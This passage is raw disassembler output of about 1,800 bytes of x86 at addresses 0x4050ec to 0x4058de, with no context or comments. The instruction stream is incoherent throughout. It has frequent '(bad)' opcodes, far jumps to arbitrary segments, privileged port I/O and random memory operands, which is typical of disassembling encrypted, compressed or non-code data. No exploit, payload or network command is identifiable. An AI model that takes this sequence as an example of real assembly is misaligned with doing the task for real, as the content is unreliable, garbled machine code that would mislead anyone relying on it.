  4050ec:	pop    ecx
  4050ed:	adc    BYTE PTR [eax+0x44],0x89
  4050f1:	push   ebx
  4050f2:	dec    esp
  4050f3:	(bad)  
  4050f4:	mov    ah,0x2e
  4050f6:	jns    0x40514e
  4050f8:	lods   al,BYTE PTR ds:[esi]
  4050f9:	and    ch,ah
  4050fb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4050fc:	xor    cl,BYTE PTR ds:0x4feb648
  405102:	ja     0x40508d
  405104:	retf   0x63d6
  405107:	jmp    0xf7b1:0xc8524acf
  40510e:	lahf   
  40510f:	xchg   DWORD PTR [eax-0x51],esi
  405112:	repnz (bad) 
  405114:	jmp    0x8da12151
  405119:	mov    ch,0x54
  40511b:	cwde   
  40511c:	ins    DWORD PTR es:[edi],dx
  40511d:	cli    
  40511e:	or     al,0x28
  405120:	mov    bh,0x54
  405122:	xor    DWORD PTR [ebp+0x71069252],edi
  405128:	call   0x9b62:0x814a369b
  40512f:	ret    
  405130:	ja     0x405164
  405132:	jg     0x4050cd
  405134:	iret   
  405135:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405136:	daa    
  405137:	xor    cl,0x29
  40513a:	push   edx
  40513b:	sbb    DWORD PTR [esi],ebp
  40513d:	cmp    ah,BYTE PTR [ebx-0x4a]
  405140:	or     eax,0x46a228f
  405145:	jnp    0x40511c
  405147:	xor    eax,0x89b660f9
  40514c:	repnz xlat BYTE PTR ds:[ebx]
  40514e:	jp     0x4050e7
  405150:	fmul   DWORD PTR [edx-0x516e5fa0]
  405156:	into   
  405157:	retf   0x9056
  40515a:	ret    0xfd3e
  40515d:	jp     0x4050fe
  40515f:	repnz mov al,0x35
  405162:	rcr    edx,0x98
  405165:	fistp  QWORD PTR [eax+edx*2]
  405168:	scas   eax,DWORD PTR es:[edi]
  405169:	mov    al,0x9d
  40516b:	jmp    0x4108:0x9bf23ccf
  405172:	mov    edx,0x68ca7b30
  405177:	mov    dl,BYTE PTR [esi+0x45997bb2]
  40517d:	rcr    DWORD PTR ds:0x9bf466d7,1
  405183:	popf   
  405184:	jno    0x405179
  405186:	stc    
  405187:	mov    ah,0xf6
  405189:	fst    DWORD PTR [esi]
  40518b:	gs int 0x10
  40518e:	dec    edx
  40518f:	sub    BYTE PTR [ecx],0xe6
  405192:	pop    ss
  405193:	or     ecx,DWORD PTR [edi+0x44]
  405196:	inc    ecx
  405197:	jne    0x405215
  405199:	aam    0x6
  40519b:	retf   
  40519c:	ficomp DWORD PTR [ebx]
  40519e:	mov    eax,ds:0x5770979f
  4051a3:	iret   
  4051a4:	mov    ah,0xdb
  4051a6:	jl     0x405206
  4051a8:	lods   al,BYTE PTR ds:[esi]
  4051a9:	xor    esi,DWORD PTR [ebx-0x37b036a9]
  4051af:	dec    esi
  4051b0:	add    ah,BYTE PTR [ecx+0x22]
  4051b3:	test   eax,0xf7d5f790
  4051b8:	mov    ds:0x217bbb1b,eax
  4051bd:	mov    es,WORD PTR [ecx-0x34bfa8e1]
  4051c3:	mov    esi,esi
  4051c5:	xor    cl,BYTE PTR [ebp-0xc40c57c]
  4051cb:	or     al,BYTE PTR [ebx]
  4051cd:	in     eax,dx
  4051ce:	add    esi,DWORD PTR [esi-0x6f]
  4051d1:	or     DWORD PTR [edx+ebp*4-0x5ca77eb],esi
  4051d8:	mov    ebp,0xda7747e7
  4051dd:	dec    edi
  4051de:	sbb    eax,0xa7f6d069
  4051e3:	fstp   QWORD PTR [eax+edx*1]
  4051e6:	jp     0x405171
  4051e8:	pop    ebp
  4051e9:	jbe    0x4051db
  4051eb:	adc    DWORD PTR [eax],eax
  4051ed:	xor    al,0x32
  4051ef:	mov    eax,0x282b5ee6
  4051f4:	sbb    esi,DWORD PTR [edx+eiz*2]
  4051f7:	mov    eax,0x72e9f4e8
  4051fc:	inc    eax
  4051fd:	add    al,0xd2
  4051ff:	inc    eax
  405200:	push   ebp
  405201:	adc    BYTE PTR [esi+0x1b2bb506],cl
  405207:	jmp    DWORD PTR [ebp-0x2f966bd6]
  40520d:	pop    ebp
  40520e:	pop    ss
  40520f:	adc    ecx,esi
  405211:	xchg   esp,eax
  405212:	pushf  
  405213:	xchg   edi,eax
  405214:	mov    ds:0x99647ad3,al
  405219:	mov    ch,BYTE PTR [edx-0x26]
  40521c:	sub    DWORD PTR [edx+eax*4],0x1eee0d39
  405223:	inc    ebx
  405224:	inc    ebx
  405225:	jo     0x4051ba
  405227:	inc    edi
  405228:	ffree  st(1)
  40522a:	inc    esi
  40522b:	sub    al,0xf2
  40522d:	data16 gs aaa 
  405230:	jmp    0x40528a
  405232:	(bad)  
  405233:	sub    eax,0xf91fd484
  405238:	mov    al,ds:0xa0a43711
  40523d:	sub    edx,esi
  40523f:	cmp    eax,0xe811e3dc
  405244:	mov    eax,ds:0xab3bae30
  405249:	inc    esp
  40524a:	ins    DWORD PTR es:[edi],dx
  40524b:	mov    ds:0x7361fb26,eax
  405250:	aaa    
  405251:	(bad)  
  405252:	adc    ecx,DWORD PTR [edx]
  405254:	mov    dl,0xb1
  405256:	test   eax,0xd88608cd
  40525b:	(bad)  
  40525d:	xor    eax,0xbc98b2f4
  405262:	xchg   BYTE PTR [edi+0x2f21e354],bh
  405268:	and    cl,dl
  40526a:	rcr    BYTE PTR [ecx-0x68e2415],cl
  405270:	sbb    BYTE PTR [ecx-0x16],al
  405273:	push   ebx
  405274:	jno    0x40522b
  405276:	and    bl,0x75
  405279:	lods   al,BYTE PTR ds:[esi]
  40527a:	retf   
  40527b:	gs ins DWORD PTR es:[edi],dx
  40527d:	pop    esp
  40527e:	ss mov dl,0x29
  405281:	stc    
  405282:	push   esi
  405283:	push   ebp
  405284:	push   ds
  405285:	pop    ecx
  405286:	ret    0x4ef3
  405289:	jle    0x4052e4
  40528b:	pop    eax
  40528c:	jmp    0x6c69:0x99f5bf05
  405293:	mov    dl,0x6f
  405295:	es mov cl,0xf6
  405298:	mov    al,0xa8
  40529a:	jmp    0x4052da
  40529c:	lods   al,BYTE PTR ds:[esi]
  40529d:	addr16 mov edx,0xd3949c5d
  4052a3:	cdq    
  4052a4:	addr16 xchg ebp,eax
  4052a6:	imul   ebx,DWORD PTR [eax],0x4b
  4052a9:	mov    DWORD PTR [edx-0x370e0139],esi
  4052af:	push   ds
  4052b0:	cmp    ch,ah
  4052b2:	into   
  4052b3:	scas   eax,DWORD PTR es:[edi]
  4052b4:	jmp    0x405252
  4052b6:	add    eax,0xeadb0f32
  4052bb:	mov    ecx,es
  4052bd:	pusha  
  4052be:	or     BYTE PTR [esi+0x54],bh
  4052c1:	fcom   DWORD PTR [eax+0x3a0441d3]
  4052c7:	and    ch,BYTE PTR [esi+0x33]
  4052ca:	es (bad) 
  4052cc:	out    0xf0,al
  4052ce:	in     eax,dx
  4052cf:	xor    cl,BYTE PTR [ebp+0x69]
  4052d2:	hlt    
  4052d3:	popa   
  4052d4:	loopne 0x4052d5
  4052d6:	push   esi
  4052d7:	dec    esp
  4052d8:	push   DWORD PTR [ecx+0xe]
  4052db:	adc    ecx,DWORD PTR [edx+0x5864ec63]
  4052e1:	jg     0x4052a0
  4052e3:	cwde   
  4052e4:	popa   
  4052e5:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4052e6:	mov    edx,0xdacf6b1d
  4052ec:	mov    cl,0x2c
  4052ee:	dec    esp
  4052ef:	jbe    0x40531c
  4052f1:	pop    ecx
  4052f2:	sub    edx,DWORD PTR [ebp-0x70]
  4052f5:	sub    al,0x33
  4052f7:	cli    
  4052f8:	jno    0x405376
  4052fa:	sbb    ebp,DWORD PTR [edi+0x72]
  4052fd:	or     eax,0x24f7621a
  405302:	shr    BYTE PTR [ecx],cl
  405304:	outs   dx,BYTE PTR ds:[esi]
  405305:	push   esi
  405306:	iret   
  405307:	cs push ds
  405309:	inc    ecx
  40530a:	adc    DWORD PTR [ebp+0x4c],edx
  40530d:	cmp    ebp,esi
  40530f:	mov    bl,0xa0
  405311:	dec    esi
  405312:	sub    al,ah
  405314:	inc    esp
  405315:	inc    esi
  405316:	sbb    eax,0xa94135f9
  40531b:	mul    eax
  40531d:	test   eax,0xa1d024c3
  405322:	xchg   esp,eax
  405323:	jmp    0x342da09e
  405328:	pop    ebx
  405329:	jle    0x405388
  40532b:	or     BYTE PTR [ecx],al
  40532d:	popf   
  40532e:	ins    BYTE PTR es:[edi],dx
  40532f:	or     al,0x68
  405331:	(bad)  
  405332:	repz mov ebx,ss
  405335:	mov    ah,0x8d
  405337:	cmp    ebx,ebx
  405339:	sub    DWORD PTR [esi+0x52],ebx
  40533c:	inc    eax
  40533d:	push   eax
  40533e:	cdq    
  40533f:	lock (bad) 
  405341:	mov    eax,DWORD PTR [bx+si-0x3d97]
  405346:	pop    edi
  405347:	sub    bl,BYTE PTR [ebx-0x78]
  40534a:	adc    esi,DWORD PTR [ecx-0x427be042]
  405350:	loope  0x4052ec
  405352:	ins    DWORD PTR es:[edi],dx
  405353:	add    eax,0x5c6451fd
  405358:	pop    ss
  405359:	mov    WORD PTR [esi-0x66],?
  40535c:	sbb    cl,BYTE PTR [edi-0x15]
  40535f:	cmp    DWORD PTR [esi-0x73],edx
  405362:	cmp    DWORD PTR [ecx-0x4d6df20c],esp
  405368:	push   esp
  405369:	retf   0x205a
  40536c:	add    al,0x53
  40536e:	sub    al,0x5f
  405370:	jns    0x4053d3
  405372:	jg     0x4053cd
  405374:	ins    DWORD PTR es:[edi],dx
  405375:	cmp    BYTE PTR [ecx-0x45],ch
  405378:	lea    ecx,[ecx-0x2c]
  40537b:	icebp  
  40537c:	adc    ebx,DWORD PTR [ebp-0x63]
  40537f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405380:	pop    edx
  405381:	pop    esi
  405382:	call   0x6f2566c9
  405387:	inc    esp
  405388:	mov    esp,DWORD PTR [ecx+0x6b]
  40538b:	(bad)  
  40538c:	in     al,0x1b
  40538e:	ins    DWORD PTR es:[edi],dx
  40538f:	scas   al,BYTE PTR es:[edi]
  405390:	mov    eax,0x82b47d97
  405395:	(bad)  
  405396:	(bad)  
  405397:	xchg   esp,eax
  405398:	ficomp WORD PTR [edi+0x6c]
  40539b:	test   dl,dh
  40539d:	cli    
  40539e:	or     ah,BYTE PTR [esi+0x1f]
  4053a1:	stos   DWORD PTR es:[edi],eax
  4053a2:	mov    esp,0xffcc56e6
  4053a7:	cli    
  4053a8:	inc    ecx
  4053aa:	mov    ebp,0xbf9d8478
  4053af:	fld    TBYTE PTR [eax+0x63dbd6bb]
  4053b5:	std    
  4053b6:	and    eax,0xcb642b66
  4053bb:	push   cs
  4053bc:	xchg   ecx,eax
  4053bd:	fs cld 
  4053bf:	and    dh,BYTE PTR [ecx-0x52]
  4053c2:	hlt    
  4053c3:	jmp    0xd391:0x69ea1e38
  4053ca:	test   DWORD PTR [edi+0x7ca77a96],esi
  4053d0:	mov    ch,0x61
  4053d2:	pop    ds
  4053d3:	xchg   edi,eax
  4053d4:	cmovs  ebx,DWORD PTR [ecx-0x350aaa8a]
  4053db:	int    0x7
  4053dd:	mov    ebx,0x6eea121
  4053e2:	xor    DWORD PTR [esi+0x53f6c086],edx
  4053e8:	dec    ebx
  4053e9:	cmp    eax,DWORD PTR [edx+0x3e]
  4053ec:	sbb    dl,bl
  4053ee:	inc    ecx
  4053ef:	mov    esp,0xdd55060e
  4053f4:	adc    BYTE PTR [eax-0x12],bh
  4053f7:	in     eax,dx
  4053f8:	pop    ecx
  4053f9:	or     DWORD PTR [esp+eiz*4],ecx
  4053fc:	cmp    BYTE PTR [edi+0x23f24e55],dh
  405402:	loope  0x4053f1
  405404:	cwde   
  405405:	retf   
  405406:	loopne 0x4053b9
  405408:	imul   edx,DWORD PTR ds:0xffda45c3,0x5372fa07
  405412:	jae    0x4053b7
  405414:	push   esp
  405415:	aaa    
  405416:	fistp  QWORD PTR [eax]
  405418:	push   ebp
  405419:	icebp  
  40541a:	lods   al,BYTE PTR ds:[esi]
  40541b:	in     eax,0x8c
  40541d:	(bad)  
  40541e:	mov    ecx,eax
  405420:	xor    cl,al
  405422:	or     dh,BYTE PTR [edi+ebp*8]
  405425:	and    DWORD PTR [ecx+0x25],eax
  405428:	push   ecx
  405429:	mov    edx,0xc118bd78
  40542e:	sub    bl,BYTE PTR [ecx-0x1e1ad82a]
  405434:	xchg   ecx,eax
  405435:	mov    esp,0xd47ea7ca
  40543a:	(bad)  
  40543b:	std    
  40543c:	mov    ds:0xf81a2507,al
  405441:	int    0xd2
  405443:	xor    BYTE PTR [eax-0x3eccca37],bl
  405449:	push   es
  40544a:	dec    edx
  40544b:	pop    ebx
  40544c:	pop    ecx
  40544d:	lds    esp,FWORD PTR [esi]
  40544f:	(bad)  
  405450:	jmp    FWORD PTR [edi-0x58f3417f]
  405456:	dec    ebp
  405457:	clc    
  405458:	imul   ecx,DWORD PTR [esi-0x470db312],0xf4d30354
  405462:	daa    
  405463:	fadd   QWORD PTR [eax]
  405465:	out    0x86,al
  405467:	xchg   esp,eax
  405468:	sbb    dl,BYTE PTR [ebp-0xd0be8f9]
  40546e:	mov    esi,DWORD PTR [si+0x70fd]
  405473:	mov    eax,0x794de732
  405478:	or     eax,0x6b8e710e
  40547d:	xchg   ebx,esp
  40547f:	xchg   BYTE PTR [esi-0x3fbab356],ah
  405485:	mov    dl,0x33
  405487:	xchg   esi,eax
  405488:	mov    BYTE PTR [eax+0x55e6188],bh
  40548e:	sub    eax,0x16899d63
  405493:	or     al,0xbb
  405495:	pusha  
  405496:	and    esi,DWORD PTR [edi+0x44]
  405499:	cmp    BYTE PTR [edx-0x433ae981],0x9b
  4054a0:	sub    BYTE PTR [edx-0x1fd03834],bh
  4054a6:	fisub  DWORD PTR [eax+0x4c]
  4054a9:	scas   al,BYTE PTR es:[edi]
  4054aa:	cmp    BYTE PTR [ecx+0x28],bh
  4054ad:	mov    ah,0xb6
  4054af:	xchg   ecx,eax
  4054b0:	push   cs
  4054b1:	mov    cs,ebx
  4054b3:	add    BYTE PTR [ebx],ah
  4054b5:	pop    edi
  4054b6:	imul   ebx,DWORD PTR [edi+0x65c5a586],0x80814554
  4054c0:	popf   
  4054c1:	pop    ds
  4054c2:	push   ebx
  4054c3:	sar    DWORD PTR [eax+0x58],cl
  4054c6:	call   DWORD PTR [ebp+edx*1+0x50ab582e]
  4054cd:	jp     0x4054d9
  4054cf:	popf   
  4054d0:	add    DWORD PTR [ebx+esi*4-0x32c100b7],0x866fd8d3
  4054db:	jg     0x40551d
  4054dd:	ins    BYTE PTR es:[edi],dx
  4054de:	mov    ch,0x62
  4054e0:	shr    DWORD PTR [edx-0x71],0xd0
  4054e4:	mov    bh,bl
  4054e6:	push   0x38
  4054e8:	jnp    0x405527
  4054ea:	cmp    ebx,DWORD PTR [eax]
  4054ec:	addr16 pop esi
  4054ee:	out    0xb0,al
  4054f0:	ficom  DWORD PTR [esi+0x52]
  4054f3:	fstp   TBYTE PTR [ecx-0x72b8bd7e]
  4054f9:	repnz sub DWORD PTR [ecx+edx*4],edi
  4054fd:	dec    eax
  4054fe:	dec    ebp
  4054ff:	idiv   DWORD PTR [ebx+0x52934777]
  405505:	shl    bh,1
  405507:	test   al,0xb3
  405509:	or     bh,0xdf
  40550c:	lahf   
  40550d:	mov    esp,0xefd10abb
  405512:	popf   
  405513:	icebp  
  405514:	mov    eax,0x897d3e8f
  405519:	or     BYTE PTR [ebx],cl
  40551b:	test   al,0x94
  40551d:	cmp    eax,0xffbe6493
  405522:	retf   
  405523:	sub    DWORD PTR [eax+0x3bd78de9],0xffffff96
  40552a:	push   0xba2c2a00
  40552f:	mov    ds:0xe5f5a31a,eax
  405534:	sbb    al,0xcf
  405536:	fdiv   DWORD PTR [edx]
  405538:	fist   DWORD PTR [esi+0x28]
  40553b:	arpl   WORD PTR [edx-0x48],ax
  40553e:	and    BYTE PTR [ecx-0x1a],0xc9
  405542:	mov    eax,ds:0x72acc0ef
  405547:	loope  0x40551c
  405549:	add    dh,dh
  40554b:	dec    edi
  40554c:	in     eax,0xd6
  40554e:	std    
  40554f:	aam    0x46
  405551:	fidiv  DWORD PTR [edx]
  405553:	sti    
  405554:	sbb    ch,ah
  405556:	jbe    0x40558b
  405558:	fwait
  405559:	lods   eax,DWORD PTR ds:[esi]
  40555a:	ss cli 
  40555c:	(bad)  
  40555d:	fnstenv [esi+0x52]
  405560:	sahf   
  405561:	je     0x40559b
  405563:	and    cl,BYTE PTR [edi+0x62de542e]
  405569:	adc    eax,0x39c40d66
  40556e:	and    esi,DWORD PTR [esp+eax*4+0xb]
  405572:	or     DWORD PTR ss:[eax-0x3e],edi
  405576:	test   DWORD PTR [ecx],edi
  405578:	xchg   edx,eax
  405579:	retf   0x96ed
  40557c:	mov    ah,0xbd
  40557e:	int3   
  40557f:	xchg   DWORD PTR [edx],ebx
  405581:	ror    BYTE PTR [ecx-0x39],1
  405584:	jmp    0x16a3:0x4064c861
  40558b:	and    eax,DWORD PTR [edx-0x32af7c38]
  405591:	mov    eax,ds:0xaf3b656a
  405596:	push   0xc6e28059
  40559b:	int3   
  40559c:	dec    ebp
  40559d:	outs   dx,BYTE PTR ds:[esi]
  40559e:	xor    al,0xd5
  4055a0:	test   DWORD PTR [edi],edi
  4055a2:	xor    BYTE PTR [edx-0x40d76600],cl
  4055a8:	cmp    cl,BYTE PTR [ebx+0x4efef8c4]
  4055ae:	pop    ebx
  4055af:	dec    ebx
  4055b0:	or     dh,cl
  4055b2:	in     al,dx
  4055b3:	pop    ebx
  4055b4:	mov    al,0xf3
  4055b6:	pop    esi
  4055b7:	fdivr  QWORD PTR [ebp-0x3236e342]
  4055bd:	cmp    BYTE PTR [esi],bh
  4055bf:	push   ecx
  4055c0:	inc    esi
  4055c1:	push   esi
  4055c2:	pushf  
  4055c3:	or     BYTE PTR [ecx],cl
  4055c5:	retf   
  4055c6:	stc    
  4055c7:	xor    al,0xba
  4055c9:	and    ah,BYTE PTR [ecx]
  4055cb:	nop
  4055cc:	cmp    eax,0x982034cb
  4055d1:	in     al,0x3a
  4055d3:	xor    bl,BYTE PTR [edx+0x1e]
  4055d6:	adc    DWORD PTR [ebx],0x8ee7070d
  4055dc:	add    eax,0x6e59e8c3
  4055e1:	cmp    edx,DWORD PTR [esi-0xb]
  4055e4:	and    eax,0x447e0d8a
  4055e9:	aam    0xcc
  4055eb:	test   DWORD PTR ss:[eax+0x2c],ebx
  4055ef:	stc    
  4055f0:	mov    cl,0x8
  4055f2:	arpl   WORD PTR [ecx-0x6],ax
  4055f5:	je     0x4055a9
  4055f7:	(bad)  
  4055f8:	push   ds
  4055f9:	add    BYTE PTR [ecx+0x3f],ch
  4055fc:	xchg   esp,eax
  4055fd:	xchg   ebp,eax
  4055fe:	pop    ebp
  4055ff:	adc    bh,0xc0
  405602:	and    eax,DWORD PTR [esi+0x63]
  405605:	pop    edx
  405606:	repnz mov al,0x7d
  405609:	(bad)  
  40560a:	lahf   
  40560b:	shl    BYTE PTR [ecx-0x68],1
  40560e:	nop
  40560f:	and    cl,BYTE PTR [ebx+0x3c0b6e65]
  405615:	ins    DWORD PTR es:[edi],dx
  405616:	push   esi
  405617:	and    edi,DWORD PTR ds:0x450ef057
  40561d:	jp     0x4055b4
  40561f:	ins    DWORD PTR es:[edi],dx
  405620:	jmp    0x32d902c8
  405625:	iret   
  405626:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405627:	neg    BYTE PTR [edi]
  405629:	(bad)  [ebx+0x5d]
  40562c:	pop    esi
  40562d:	or     esp,DWORD PTR [edi-0x67]
  405630:	outs   dx,BYTE PTR ds:[esi]
  405631:	inc    edx
  405632:	and    al,0xa9
  405634:	fidivr WORD PTR [ebx+0x5d]
  405637:	jae    0x4056b1
  405639:	aaa    
  40563a:	xchg   edx,eax
  40563b:	fdivr  QWORD PTR [edx-0x1b5f53c]
  405641:	push   ebp
  405642:	sub    al,0x5e
  405644:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405645:	scas   al,BYTE PTR es:[edi]
  405646:	push   ebx
  405647:	sub    BYTE PTR [edx-0x22],0x2e
  40564b:	jbe    0x4055e4
  40564d:	dec    ecx
  40564e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40564f:	sub    eax,0xfa86f74a
  405654:	sub    al,al
  405656:	cmp    ah,cl
  405658:	ins    BYTE PTR es:[edi],dx
  405659:	pop    edi
  40565a:	mov    ds:0xf5325967,eax
  40565f:	int    0x1d
  405661:	inc    ebx
  405662:	xor    DWORD PTR [ecx],0x1895cd48
  405668:	cmc    
  405669:	nop
  40566a:	jg     0x405615
  40566c:	dec    edx
  40566d:	cmp    edx,0x247d6d0f
  405673:	add    BYTE PTR [ecx],al
  405675:	adc    bh,cl
  405677:	push   es
  405678:	cwde   
  405679:	mov    eax,ds:0x6928cafb
  40567e:	and    eax,0xc3e07901
  405683:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  405684:	fwait
  405685:	jge    0x4056dc
  405687:	mov    ebx,0x4ef374b4
  40568c:	sbb    ebp,ecx
  40568e:	mov    al,0xd3
  405690:	cli    
  405691:	cmp    BYTE PTR [edi-0x7e],dh
  405694:	test   eax,0xa5a6d691
  405699:	clc    
  40569a:	pop    esp
  40569b:	(bad)  
  40569c:	sbb    cl,cl
  40569e:	adc    al,0x61
  4056a0:	inc    eax
  4056a1:	arpl   WORD PTR [edx-0x5d],di
  4056a4:	cmc    
  4056a5:	sbb    eax,0xa589ffd9
  4056aa:	repz shl BYTE PTR [ebx-0x37],1
  4056ae:	int3   
  4056af:	dec    ebx
  4056b0:	xchg   ebp,eax
  4056b1:	out    0xdc,al
  4056b3:	aad    0xfa
  4056b5:	jb     0x4056de
  4056b7:	cmp    DWORD PTR [ebx-0x44],0x1577dbd3
  4056be:	ret    
  4056bf:	mov    BYTE PTR [eax-0x5e],bh
  4056c2:	addr16 pop esi
  4056c4:	shr    edi,cl
  4056c6:	dec    esp
  4056c7:	or     al,0xb6
  4056c9:	in     al,dx
  4056ca:	mov    edx,0x70baaf8a
  4056cf:	or     dh,BYTE PTR [esi]
  4056d1:	or     DWORD PTR es:[edi-0x4906063e],edx
  4056d8:	push   0x38
  4056da:	out    0xd6,al
  4056dc:	out    0x1b,eax
  4056de:	adc    BYTE PTR ds:0x1b6cc3a6,al
  4056e4:	(bad)  
  4056e5:	mov    bl,0x8f
  4056e7:	js     0x405693
  4056e9:	fwait
  4056ea:	and    ebx,DWORD PTR [edx+0x7aea67b6]
  4056f0:	push   es
  4056f1:	jbe    0x4056d1
  4056f3:	xor    eax,0x52c2d04e
  4056f8:	push   ss
  4056f9:	push   0x4cb5e5c
  4056fe:	push   ebx
  4056ff:	pop    edi
  405700:	enter  0xe082,0xe
  405704:	push   0x6b
  405706:	add    al,0xb0
  405708:	inc    ebx
  405709:	add    DWORD PTR [ecx],0xffffffc8
  40570c:	fcmove st,st(3)
  40570e:	dec    ebp
  40570f:	push   ebp
  405710:	ret    0x7245
  405713:	ins    DWORD PTR es:[edi],dx
  405714:	aaa    
  405715:	stos   BYTE PTR es:[edi],al
  405716:	jle    0x405793
  405718:	jbe    0x4056be
  40571a:	mov    BYTE PTR [eax-0x3f],0x88
  40571e:	call   0x5ca4f34c
  405723:	mov    al,ds:0x1356ce42
  405728:	push   cs
  405729:	push   0x3ae5402f
  40572e:	lods   eax,DWORD PTR ds:[esi]
  40572f:	daa    
  405730:	imul   esp,DWORD PTR [esi-0x30d0e52e],0x28
  405737:	test   al,0x8
  405739:	arpl   WORD PTR [ebx+0x71],di
  40573c:	sbb    al,0xb1
  40573e:	add    al,0xd6
  405741:	push   ds
  405742:	adc    al,0xa5
  405745:	(bad)  
  405746:	xchg   edx,eax
  405747:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405748:	add    DWORD PTR [ebx-0x3],edi
  40574b:	adc    bh,ch
  40574d:	iret   
  40574e:	test   ah,bl
  405750:	fwait
  405751:	push   0x254f4403
  405756:	dec    ecx
  405757:	and    esi,0x77
  40575a:	rcl    DWORD PTR [ebx-0x5898713a],cl
  405760:	out    dx,al
  405761:	ins    BYTE PTR es:[edi],dx
  405762:	hlt    
  405763:	lea    ebp,[edx-0x270c9c]
  405769:	xchg   esp,eax
  40576a:	cld    
  40576b:	add    DWORD PTR [edx+0x65468c28],ecx
  405771:	inc    esp
  405772:	jmp    0x48298120
  405777:	add    BYTE PTR [edi-0x1016e220],0x97
  40577e:	fidivr WORD PTR [edx]
  405780:	inc    edx
  405781:	mov    ebp,0xcc273403
  405786:	fisttp DWORD PTR [edx+0x3f]
  405789:	and    ah,dh
  40578b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40578c:	aam    0x37
  40578e:	fmul   DWORD PTR [ebp-0x4e25d2e3]
  405794:	pop    esi
  405795:	fld    TBYTE PTR [edi-0xa65b13a]
  40579b:	cmp    dl,BYTE PTR [esi+eiz*4-0x2]
  40579f:	mov    bl,0xf1
  4057a1:	out    dx,al
  4057a2:	pop    ecx
  4057a3:	sbb    bl,BYTE PTR [ebp+0x70]
  4057a6:	mov    eax,ds:0x86dcc103
  4057ab:	pop    ebp
  4057ac:	xor    esp,DWORD PTR [edi]
  4057ae:	repnz xchg esp,eax
  4057b0:	add    BYTE PTR [ebp+0x92f9aa9],dl
  4057b6:	push   cs
  4057b7:	lds    esi,FWORD PTR [edi+ebx*1-0x7b4832c2]
  4057be:	cs jmp 0x1066c1bc
  4057c4:	std    
  4057c5:	adc    eax,0x12bc219e
  4057ca:	mov    edx,0xe4c50bcb
  4057cf:	rcr    dh,cl
  4057d1:	fild   QWORD PTR [ebp-0x69]
  4057d4:	push   ds
  4057d5:	cli    
  4057d6:	pop    esp
  4057d7:	push   esi
  4057d8:	out    0xec,eax
  4057da:	stos   DWORD PTR es:[edi],eax
  4057db:	mov    ebx,0x73e33f9b
  4057e0:	lods   al,BYTE PTR ds:[esi]
  4057e1:	dec    ecx
  4057e2:	jo     0x4057c4
  4057e4:	sbb    ch,BYTE PTR [ecx]
  4057e6:	cs sbb al,0x9f
  4057e9:	mov    eax,ds:0xb5ee2ef8
  4057ee:	mov    esi,0x7fec72a0
  4057f3:	sub    BYTE PTR [eax+0x48],bh
  4057f6:	adc    ch,BYTE PTR [edx]
  4057f8:	pop    WORD PTR [ebx]
  4057fb:	xor    al,0x8f
  4057fd:	jb     0x405818
  4057ff:	(bad)  
  405800:	push   edx
  405801:	nop
  405802:	jae    0x4057c9
  405804:	jns    0x4057f8
  405806:	dec    ebx
  405807:	sub    al,0x84
  405809:	mov    al,ds:0x25698b6f
  40580e:	bound  esi,QWORD PTR [ebx-0x17]
  405811:	push   cs
  405812:	fdivrp st(6),st
  405814:	xor    DWORD PTR [eax+0x23],0x57ab39
  40581b:	(bad)  
  40581d:	(bad)  
  40581e:	xchg   ecx,eax
  40581f:	into   
  405820:	test   al,0x4c
  405822:	mov    ebp,0xf52a2342
  405827:	shr    bh,cl
  405829:	sbb    DWORD PTR [ebx],ecx
  40582b:	es push 0x29
  40582e:	dec    edi
  40582f:	pop    edi
  405830:	cs push esp
  405832:	(bad)
  405836:	inc    eax
  405837:	push   cs
  405838:	mov    eax,ds:0xddcd92ba
  40583d:	mov    BYTE PTR [ecx],bl
  40583f:	dec    DWORD PTR [esi]
  405841:	jo     0x4057ea
  405843:	jno    0x405828
  405845:	lods   al,BYTE PTR ds:[esi]
  405846:	xlat   BYTE PTR ds:[ebx]
  405847:	mov    ebx,0x9d0a84ec
  40584c:	cmp    dh,BYTE PTR [ecx-0x43a34387]
  405852:	and    eax,0x1aac90d0
  405857:	(bad)  
  405859:	arpl   di,dx
  40585b:	icebp  
  40585c:	iret   
  40585d:	clc    
  40585e:	dec    esi
  40585f:	pop    edi
  405860:	and    DWORD PTR [edx-0x4fb32768],eax
  405866:	and    BYTE PTR [edi],0x91
  405869:	mov    ebx,DWORD PTR [edi-0x60]
  40586c:	pop    esi
  40586d:	add    DWORD PTR [ebx],esp
  40586f:	or     esi,DWORD PTR [ebp-0x21]
  405872:	mov    ecx,0x3a839e6e
  405877:	neg    DWORD PTR [esi]
  405879:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40587a:	xchg   ecx,eax
  40587b:	pop    eax
  40587c:	mov    ecx,0x2bbeacc6
  405881:	ins    DWORD PTR es:[edi],dx
  405882:	mov    edi,0xb7b5ab61
  405887:	dec    eax
  405888:	and    edx,ebp
  40588a:	dec    esi
  40588b:	scas   eax,DWORD PTR es:[edi]
  40588c:	sub    DWORD PTR [eax-0x64b58af6],ebx
  405892:	es push es
  405894:	(bad)  
  405895:	enter  0xc004,0x36
  405899:	xchg   esi,eax
  40589a:	mov    edx,0x66fd3a5d
  40589f:	pop    es
  4058a0:	ds imul ax,bp,0x8
  4058a6:	push   ecx
  4058a7:	add    DWORD PTR [ecx],esp
  4058a9:	pop    ebp
  4058aa:	and    BYTE PTR [edx-0x5c28219e],0xfe
  4058b1:	aad    0x56
  4058b3:	mov    ecx,0x71042de7
  4058b8:	shl    BYTE PTR [esp+edx*4],0xde
  4058bc:	pushf  
  4058bd:	cmp    al,BYTE PTR [ebx]
  4058bf:	sub    al,0x59
  4058c1:	sbb    DWORD PTR [edx+ebp*4],edx
  4058c4:	inc    edx
  4058c5:	mov    WORD PTR [edi],ss
  4058c7:	outs   dx,DWORD PTR ds:[esi]
  4058c8:	rcl    BYTE PTR [ebp+0x37],1
  4058cb:	call   0x7c0d:0xd9478dbc
  4058d2:	in     eax,dx
  4058d3:	mov    ds:0xf13e333,al
  4058d8:	inc    edx
  4058d9:	adc    eax,0x2536fa0
  4058de:	adc    BYTE PTR [ebx-0x33],dl
